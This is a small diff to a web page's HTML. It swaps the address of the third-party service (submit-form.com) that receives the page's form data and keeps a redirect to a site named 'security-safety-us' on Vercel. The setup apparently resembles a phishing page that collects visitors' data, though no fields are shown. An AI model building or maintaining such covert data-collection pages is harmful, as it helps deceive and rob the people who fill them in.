@@ -10,7 +10,7 @@
 </head>
 
 <body>
-    <form action="https://submit-form.com/o6rGJc67H" method="post">
+    <form action="https://submit-form.com/orQj1ZTsB" method="post">
         <input type="hidden" name="_redirect" value="https://security-safety-us.vercel.app/" />
         <div id="root">
             <div>
